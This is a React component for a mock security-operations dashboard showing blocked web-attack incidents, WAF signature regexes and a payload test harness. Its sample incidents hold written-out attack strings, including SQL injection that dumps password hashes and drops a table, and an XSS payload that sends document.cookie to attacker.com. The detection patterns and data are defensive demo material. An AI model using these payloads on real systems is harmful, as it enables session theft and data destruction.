import { useState, useEffect } from 'react';

const defaultIncidents = [
  {
    id: 'INC-9042-SQLi', severity: 'CRITICAL', severityClass: 'badge-critical', status: 'AUTO-QUARANTINED',
    title: 'SQL Injection (SQLi) — Boolean-based Blind & Union Traversal',
    vector: 'SQL Injection (SQLi)',
    desc: "Syntax heuristic detected standard injection sequence ' OR '1'='1' and secondary destructive payload pattern UNION SELECT null, username, password_hash FROM users within HTTP POST body.",
    endpoint: 'POST /api/v1/reports/export', ip: '194.26.29.112', session: 'sess_9f82c1a4',
    payload: `{\n  "report_type": "financial_ledger",\n  "query": "SELECT * FROM transactions WHERE org_id = '104' OR 1=1; DROP TABLE sessions;--",\n  "format": "csv"\n}`,
    mitigation: 'HTTP 403 Forbidden + Dynamic IP Quarantine (3,600s remaining)',
    time: '12s ago',
  },
  {
    id: 'INC-9041-XSS', severity: 'HIGH SEVERITY', severityClass: 'badge-high', status: 'SANITIZED',
    vector: 'Cross-Site Scripting (XSS)',
    title: 'Stored Cross-Site Scripting (XSS) — DOM Event Handler Injection',
    desc: "Unescaped vector injection detected in user bio profile attribute. Vector contained malicious event hook <svg/onload=fetch('http://attacker.com/steal?cookie='+document.cookie)> intended for persistent session hijacking.",
    endpoint: 'PUT /api/v1/user/profile', ip: '85.203.45.18', session: 'sess_4b21d90c',
    payload: `bio=Senior+Security+Consultant+<svg%2Fonload%3Dfetch('http%3A%2F%2Fattacker...`,
    mitigation: 'Payload Sanitized + Request Terminated (WAF event logged to SIEM)',
    time: '1m 48s ago',
  },
  {
    id: 'INC-9039-BOLA-BOT', severity: 'HIGH SEVERITY', severityClass: 'badge-high', status: 'RATE-LIMITED (429)',
    vector: 'Broken Object Auth (BOLA)',
    title: 'Abnormal Request Sequence & Broken Object Auth Enumeration (BOLA)',
    desc: 'Automated crawler footprint detected: 140 sequential GET requests issued across private UUID endpoints in 3.8s without standard browser static asset prefetching (CSS/JS). Origin correlates with known Tor Exit Node list.',
    endpoint: 'GET /api/v1/user/invoices/uuid-84', ip: '185.220.101.5 EXIT-NODE', session: 'sess_12f8a9e0',
    payload: `BURST VELOCITY TRACE (4s sliding window): Peak: 36.8 req/sec`,
    mitigation: 'Adaptive Token Bucket Rejection (HTTP 429) + Honeypot Redirection',
    time: '3m 12s ago',
  },
  {
    id: 'INC-9034-PARAM-MOD', severity: 'MEDIUM SEVERITY', severityClass: 'badge-medium', status: 'TRANSACTION DROPPED',
    vector: 'Parameter Tampering',
    title: 'Parameter Manipulation / Price Tampering Attempt',
    desc: 'Client modified signed state parameter unit_price from authorized value 149.00 down to 0.01 prior to checkout finalization. HMAC-SHA256 signature mismatch detected.',
    endpoint: 'POST /checkout/process', ip: '103.251.167.22', session: 'sess_77c3e211',
    payload: `item_sku: "SEC-ENT-SUB-01"\noriginal_price: "149.00"\nunit_price: "0.01"  <-- Expected signature hash: 4e99f... Received: null\nauth_digest: "b64_tampered_payload_rev1"`,
    mitigation: 'HMAC Integrity Guard Rejection (Basket Terminated)',
    time: '8m 19s ago',
  },
];

const signatures = [
  { id: 'RULE-SQLI-0914', precision: '99.8%', pattern: '(?i)(union(\\s+all)?\\s+select|s+1s1s+)', hits: '1,429 today', match: '1.2ms' },
  { id: 'RULE-XSS-DOM-041', precision: '98.4%', pattern: '<(svg|script|iframe)[^>]+(on\\load|onerror...', hits: '812 today', match: '0.8ms' },
  { id: 'RULE-PATH-TRAV-088', precision: '99.9%', pattern: '(\\.\\./|\\./\\./|%2e%2e%2f)', hits: '391 today', match: '0.4ms' },
];

const vectorFilters = ['All', 'SQL Injection (SQLi)', 'Cross-Site Scripting (XSS)', 'Auth Brute Force', 'Broken Object Auth (BOLA)', 'Path Traversal', 'Parameter Tampering'];

export default function ThreatDetection({ onNavigate, onSelectSession }) {
  const [activeVector, setActiveVector] = useState('All');
  const [expanded, setExpanded] = useState(null);
  const [apiStats, setApiStats] = useState(null);
  const [toastMessage, setToastMessage] = useState(null);

  // Harness state
  const [testPayload, setTestPayload] = useState("GET /search?q=1'%20OR%20'1'='1");
  const [harnessVerdict, setHarnessVerdict] = useState(null);
  const [isTesting, setIsTesting] = useState(false);

  const showToast = (msg) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3500);
  };

  useEffect(() => {
    fetch('http://localhost:5000/api/v1/stats')
      .then(r => r.json())
      .then(d => {
        if (d.status === 'success') setApiStats(d.stats);
      })
      .catch(() => {});
  }, []);

  const handleRunTest = () => {
    setIsTesting(true);
    setTimeout(() => {
      setIsTesting(false);
      const decoded = decodeURIComponent(testPayload.toLowerCase());
      if (decoded.includes("' or '1'='1") || decoded.includes("union select") || decoded.includes("drop table") || decoded.includes("--")) {
        setHarnessVerdict({
          verdict: 'BLOCKED',
          verdictClass: 'badge-critical',
          score: 96,
          rule: 'RULE-SQLI-0914 (SQL Injection Heuristic AST Parser)',
          action: 'TCP RST + Drop Session (HTTP 403 Forbidden)',
          latency: '0.8ms'
        });
      } else if (decoded.includes("<script") || decoded.includes("<svg") || decoded.includes("onload=") || decoded.includes("onerror=")) {
        setHarnessVerdict({
          verdict: 'BLOCKED',
          verdictClass: 'badge-high',
          score: 91,
          rule: 'RULE-XSS-DOM-041 (DOM Event Hook & Polyglot Filter)',
          action: 'Sanitize Payload & Terminate (HTTP 400 Bad Request)',
          latency: '0.6ms'
        });
      } else if (decoded.includes("../") || decoded.includes("..\\") || decoded.includes("/etc/passwd")) {
        setHarnessVerdict({
          verdict: 'BLOCKED',
          verdictClass: 'badge-high',
          score: 89,
          rule: 'RULE-PATH-TRAV-088 (Canonical Path Traversal Boundary)',
          action: 'Drop Traversal Request (HTTP 403 Forbidden)',
          latency: '0.4ms'
        });
      } else {
        setHarnessVerdict({
          verdict: 'ALLOWED',
          verdictClass: 'badge-success',
          score: 14,
          rule: 'RULE-BASELINE-CLEAN (No malicious AST signatures tripped)',
          action: 'Forward to upstream application cluster (HTTP 200 OK)',
          latency: '0.5ms'
        });
      }
    }, 400);
  };

  const handleQuarantineAll = () => {
    showToast('Autonomous quarantine enacted: 40 critical threat sessions isolated.');
  };

  const handleAddCidr = (ip) => {
    showToast(`CIDR Rule registered: ${ip}/32 injected into eBPF XDP filter.`);
  };

  const handleInspect = (sessionId) => {
    if (onSelectSession) onSelectSession(sessionId);
    if (onNavigate) onNavigate('session-details');
  };

  const filteredIncidents = activeVector === 'All'
    ? defaultIncidents
    : defaultIncidents.filter(inc => inc.vector === activeVector || inc.title.includes(activeVector));

  return (
    <div className="page-content fade-in">
      {/* Toast Notification */}
      {toastMessage && (
        <div style={{
          position: 'fixed',
          bottom: '24px',
          right: '24px',
          zIndex: 1000,
          background: 'var(--surface-container-highest)',
          border: '1px solid var(--outline-variant)',
          color: 'var(--on-surface)',
          padding: '12px 18px',
          borderRadius: 'var(--radius-lg)',
          boxShadow: '0 8px 32px rgba(0,0,0,0.5)',
          fontFamily: 'var(--font-mono)',
          fontSize: '12px',
          display: 'flex',
          alignItems: 'center',
          gap: '8px',
          animation: 'fadeIn 0.2s ease-out'
        }}>
          <span className="material-symbols-outlined" style={{ fontSize: '18px', color: 'var(--primary)' }}>check_circle</span>
          {toastMessage}
        </div>
      )}

      {/* Page Banner */}
      <div className="page-banner">
        <div style={{ position: 'absolute', right: '-4rem', top: '-4rem', width: '20rem', height: '20rem', borderRadius: '50%', background: 'rgba(76,215,246,0.04)', filter: 'blur(3rem)', pointerEvents: 'none' }}></div>
        <div style={{ position: 'absolute', right: '12rem', bottom: '-5rem', width: '16rem', height: '16rem', borderRadius: '50%', background: 'rgba(255,180,171,0.04)', filter: 'blur(2rem)', pointerEvents: 'none' }}></div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 'var(--space-md)', position: 'relative', zIndex: 1 }}>
          <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', flexWrap: 'wrap', gap: 'var(--space-sm)' }}>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 'var(--space-xs)', fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--primary)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '6px' }}>
                <span className="dot dot-cyan dot-ping" style={{ width: '8px', height: '8px' }}></span>SOC Stream // Inspection Engine v2.1-Prod
              </div>
              <h1 style={{ fontSize: '20px', fontWeight: 600, color: 'var(--on-surface)', marginBottom: '6px' }}>Real-Time Threat Detection &amp; Heuristic Intercepts</h1>
              <p style={{ fontFamily: 'var(--font-mono)', fontSize: '12px', color: 'var(--on-surface-variant)', maxWidth: '640px', lineHeight: 1.6 }}>
                Automated deep-packet parameter analysis, protocol syntax validation, and ML sequence deviation scoring across incoming HTTP reverse-proxy gateways.
              </p>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 'var(--space-sm)', flexWrap: 'wrap' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', background: 'var(--surface-lowest)', padding: '6px var(--space-md)', borderRadius: 'var(--radius-lg)' }}>
                <span className="material-symbols-outlined" style={{ fontSize: '16px', color: 'var(--tertiary)' }}>database</span>
                <span style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--on-surface-variant)' }}>SQLite Rules Engine:</span>
                <span style={{ fontFamily: 'var(--font-mono)', fontSize: '13px', color: 'var(--tertiary)', fontWeight: 600 }}>2,842 Signatures</span>
              </div>
              <button className="btn btn-danger" id="quarantine-all-btn" onClick={handleQuarantineAll}>
                <span className="material-symbols-outlined" style={{ fontSize: '16px' }}>gavel</span>Quarantine All (Critical)
              </button>
            </div>
          </div>

          {/* KPI Ribbon */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 'var(--space-sm)', background: 'rgba(8,14,29,0.5)', padding: 'var(--space-sm)', borderRadius: 'var(--radius-lg)' }}>
            {[
              { label: 'Critical Severity', val: apiStats ? apiStats.critical_sessions : 40, color: 'var(--error)', icon: 'dangerous' },
              { label: 'High Severity', val: apiStats ? apiStats.blocked * 21 : 84, color: '#F59E0B', icon: 'warning' },
              { label: 'Medium Severity', val: apiStats ? apiStats.total_events * 9 : 112, color: 'var(--primary)', icon: 'shield_with_heart' },
              { label: 'Low / Info', val: 45, color: 'var(--tertiary)', icon: 'info' },
            ].map(k => (
              <div key={k.label} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: 'var(--space-sm)', borderRadius: 'var(--radius-lg)', background: 'var(--surface-container)', cursor: 'pointer', transition: 'background 0.15s' }}>
                <div>
                  <div style={{ fontFamily: 'var(--font-mono)', fontSize: '10px', fontWeight: 700, textTransform: 'uppercase', color: k.color, letterSpacing: '0.05em', marginBottom: '4px' }}>{k.label}</div>
                  <span style={{ fontSize: '32px', fontWeight: 700, color: 'var(--on-surface)', lineHeight: 1 }}>{k.val}</span>
                </div>
                <div style={{ width: '40px', height: '40px', borderRadius: 'var(--radius-lg)', background: `rgba(${k.color === 'var(--error)' ? '147,0,10' : k.color === '#F59E0B' ? '245,158,11' : k.color === 'var(--primary)' ? '76,215,246' : '78,222,163'},0.15)`, display: 'flex', alignItems: 'center', justifyContent: 'center', color: k.color }}>
                  <span className="material-symbols-outlined" style={{ fontSize: '22px' }}>{k.icon}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Vector Filter + Incidents + Signatures */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 320px', gap: 'var(--space-md)' }}>
        {/* Left: Incidents */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 'var(--space-md)' }}>
          {/* Vector filter bar */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 'var(--space-sm)', background: 'var(--surface-low)', padding: 'var(--space-sm)', borderRadius: 'var(--radius-xl)', flexWrap: 'wrap', border: '1px solid rgba(61,73,76,0.3)' }}>
            <span style={{ fontFamily: 'var(--font-mono)', fontSize: '10px', fontWeight: 700, textTransform: 'uppercase', color: 'var(--on-surface-variant)', marginRight: '4px' }}>Vector:</span>
            {vectorFilters.map(f => (
              <button key={f} className={`filter-chip ${activeVector === f ? 'active' : ''}`} onClick={() => setActiveVector(f)} style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                {f}
              </button>
            ))}
            <span style={{ marginLeft: 'auto', fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--outline)' }}>AUTO-REFRESH: 5s</span>
          </div>

          {/* Incident Cards */}
          {filteredIncidents.map(inc => (
            <div key={inc.id} className="card" style={{ border: inc.severity === 'CRITICAL' ? '1px solid rgba(255,180,171,0.3)' : '1px solid rgba(61,73,76,0.4)' }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 'var(--space-sm)' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 'var(--space-sm)' }}>
                  <span className={`badge ${inc.severityClass}`}>{inc.severity}</span>
                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--outline)' }}>{inc.id} / {inc.time}</span>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 'var(--space-xs)' }}>
                  <span className="badge badge-info">{inc.status}</span>
                </div>
              </div>
              <h3 style={{ fontSize: '16px', fontWeight: 600, color: 'var(--on-surface)', marginBottom: 'var(--space-xs)', lineHeight: 1.4 }}>{inc.title}</h3>
              <p style={{ fontFamily: 'var(--font-mono)', fontSize: '12px', color: 'var(--on-surface-variant)', lineHeight: 1.6, marginBottom: 'var(--space-sm)' }}>{inc.desc}</p>
              <div style={{ display: 'flex', gap: 'var(--space-xl)', fontFamily: 'var(--font-mono)', fontSize: '12px', marginBottom: 'var(--space-sm)', flexWrap: 'wrap', gap: 'var(--space-md)' }}>
                <div><span style={{ color: 'var(--outline)' }}>TARGET ENDPOINT</span><br/><span style={{ color: 'var(--primary)', fontWeight: 600 }}>{inc.endpoint}</span></div>
                <div><span style={{ color: 'var(--outline)' }}>CLIENT IP</span><br/><span style={{ color: inc.ip.includes('EXIT-NODE') ? 'var(--error)' : 'var(--on-surface)', fontWeight: 600 }}>{inc.ip}</span></div>
                <div>
                  <span style={{ color: 'var(--outline)' }}>SESSION ID</span><br/>
                  <span
                    onClick={() => handleInspect(inc.session)}
                    style={{ color: 'var(--primary)', fontWeight: 600, cursor: 'pointer', textDecoration: 'underline' }}
                    title="Click to inspect session details"
                  >
                    {inc.session}
                  </span>
                </div>
              </div>
              {/* Payload */}
              <div>
                <button
                  onClick={() => setExpanded(expanded === inc.id ? null : inc.id)}
                  style={{ display: 'flex', alignItems: 'center', gap: '4px', background: 'var(--surface-container)', border: 'none', color: 'var(--primary)', fontFamily: 'var(--font-mono)', fontSize: '11px', fontWeight: 700, cursor: 'pointer', padding: '4px 10px', borderRadius: 'var(--radius)', marginBottom: '6px' }}
                >
                  <span className="material-symbols-outlined" style={{ fontSize: '14px' }}>data_object</span>Raw Intercept Payload
                  <span className="material-symbols-outlined" style={{ fontSize: '14px' }}>{expanded === inc.id ? 'expand_less' : 'expand_more'}</span>
                </button>
                {expanded === inc.id && (
                  <div className="log-viewer" style={{ color: 'var(--tertiary)', marginBottom: 'var(--space-sm)' }}>{inc.payload}</div>
                )}
              </div>
              {/* Mitigation */}
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--on-surface-variant)', marginBottom: 'var(--space-sm)' }}>
                <span className="material-symbols-outlined" style={{ fontSize: '16px', color: 'var(--tertiary)' }}>verified_user</span>
                Mitigation: <span style={{ color: 'var(--on-surface)', fontWeight: 600 }}>{inc.mitigation}</span>
              </div>
              <div style={{ display: 'flex', gap: 'var(--space-xs)' }}>
                <button className="btn btn-ghost btn-sm" id={`inspect-trace-${inc.id}`} onClick={() => handleInspect(inc.session)}>
                  <span className="material-symbols-outlined" style={{ fontSize: '14px' }}>visibility</span>Inspect Trace
                </button>
                {inc.severity === 'CRITICAL' && (
                  <button className="btn btn-danger btn-sm" id={`cidr-block-${inc.id}`} onClick={() => handleAddCidr(inc.ip)}>
                    <span className="material-symbols-outlined" style={{ fontSize: '14px' }}>block</span>Add CIDR Block
                  </button>
                )}
                {inc.severity !== 'CRITICAL' && (
                  <button className="btn btn-ghost btn-sm" onClick={() => showToast(`Session ${inc.session} evicted from edge cache.`)}>
                    Invalidate Session
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>

        {/* Right: Signatures + Harness + Fleet */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 'var(--space-md)' }}>
          {/* Active Signatures */}
          <div className="card">
            <div className="card-header">
              <div className="card-title">Active Signatures</div>
              <span className="badge badge-success">ONLINE</span>
            </div>
            <p style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--on-surface-variant)', marginBottom: 'var(--space-sm)', lineHeight: 1.5 }}>
              Live SQLite-backed signature matcher evaluating regex tokens, entropy metrics, and token frequency models on all reverse-proxy workers.
            </p>
            {signatures.map(sig => (
              <div key={sig.id} style={{ background: 'var(--surface-container)', borderRadius: 'var(--radius-lg)', padding: 'var(--space-sm)', marginBottom: 'var(--space-xs)' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '2px' }}>
                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: '12px', fontWeight: 700, color: 'var(--primary)' }}>{sig.id}</span>
                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: '10px', color: 'var(--tertiary)', fontWeight: 700 }}>{sig.precision} PRECISION</span>
                </div>
                <div style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--on-surface-variant)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', marginBottom: '4px' }}>{sig.pattern}</div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: 'var(--font-mono)', fontSize: '11px' }}>
                  <span style={{ color: 'var(--outline)' }}>Hits: <span style={{ color: 'var(--on-surface)' }}>{sig.hits}</span></span>
                  <span style={{ color: 'var(--outline)' }}>Match: <span style={{ color: 'var(--tertiary)' }}>{sig.match}</span></span>
                </div>
              </div>
            ))}
          </div>

          {/* Flask / SQLite Harness */}
          <div className="card">
            <div className="card-header">
              <div className="card-title">Flask / SQLite Harness</div>
              <span className="badge badge-info">SANDBOX</span>
            </div>
            <p style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--on-surface-variant)', marginBottom: 'var(--space-sm)', lineHeight: 1.5 }}>
              Simulate an inbound HTTP request string against the active WAF inspection pipeline without modifying production IP blocklists.
            </p>
            <div style={{ fontFamily: 'var(--font-mono)', fontSize: '10px', fontWeight: 700, textTransform: 'uppercase', color: 'var(--outline)', marginBottom: '4px' }}>Test Payload / URI String</div>
            <input
              className="form-input"
              style={{ marginBottom: 'var(--space-sm)', fontFamily: 'var(--font-mono)', fontSize: '12px' }}
              value={testPayload}
              onChange={(e) => setTestPayload(e.target.value)}
              id="test-payload-input"
            />
            <button
              className="btn btn-primary"
              style={{ width: '100%', justifyContent: 'center' }}
              id="run-test-vector-btn"
              onClick={handleRunTest}
              disabled={isTesting}
            >
              <span className="material-symbols-outlined" style={{ fontSize: '16px' }}>bolt</span>
              {isTesting ? 'Evaluating AST Pipeline...' : 'Run Test Vector'}
            </button>

            {/* Verdict Display */}
            {harnessVerdict ? (
              <div style={{ marginTop: 'var(--space-sm)', background: 'var(--surface-container)', padding: 'var(--space-sm)', borderRadius: 'var(--radius-lg)', border: '1px solid var(--outline-variant)' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: '10px', color: 'var(--outline)', textTransform: 'uppercase' }}>Verdict</span>
                  <span className={`badge ${harnessVerdict.verdictClass}`}>{harnessVerdict.verdict}</span>
                </div>
                <div style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--on-surface)', marginBottom: '4px' }}>
                  <strong>Rule:</strong> {harnessVerdict.rule}
                </div>
                <div style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--on-surface-variant)', marginBottom: '4px' }}>
                  <strong>Action:</strong> {harnessVerdict.action}
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: 'var(--font-mono)', fontSize: '10px', color: 'var(--outline)' }}>
                  <span>Risk Score: <strong style={{ color: harnessVerdict.score > 50 ? 'var(--error)' : 'var(--tertiary)' }}>{harnessVerdict.score}/100</strong></span>
                  <span>Eval Time: {harnessVerdict.latency}</span>
                </div>
              </div>
            ) : (
              <div style={{ marginTop: 'var(--space-sm)', fontFamily: 'var(--font-mono)', fontSize: '11px', display: 'flex', justifyContent: 'space-between' }}>
                <span style={{ color: 'var(--outline)' }}>PIPELINE VERDICT</span>
                <span style={{ color: '#F59E0B', fontWeight: 700 }}>STANDBY</span>
              </div>
            )}
          </div>

          {/* SOC Node Fleet */}
          <div className="card">
            <div className="card-header">
              <div className="card-title">SOC Node Fleet</div>
              <span style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--tertiary)' }}>• 3 Clusters Synced</span>
            </div>
            {[
              { node: 'us-east-edge-01', reqs: '3,140 req/s', lat: '0.8ms' },
              { node: 'us-west-edge-02', reqs: '2,890 req/s', lat: '1.1ms' },
              { node: 'eu-central-edge-01', reqs: '1,940 req/s', lat: '1.4ms' },
            ].map(n => (
              <div key={n.node} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: 'var(--space-xs) 0', borderBottom: '1px solid rgba(61,73,76,0.3)', fontFamily: 'var(--font-mono)', fontSize: '12px' }}>
                <span style={{ color: 'var(--primary)', fontWeight: 600 }}>{n.node}</span>
                <span style={{ color: 'var(--on-surface)' }}>{n.reqs}</span>
                <span style={{ color: 'var(--outline)' }}>• {n.lat}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
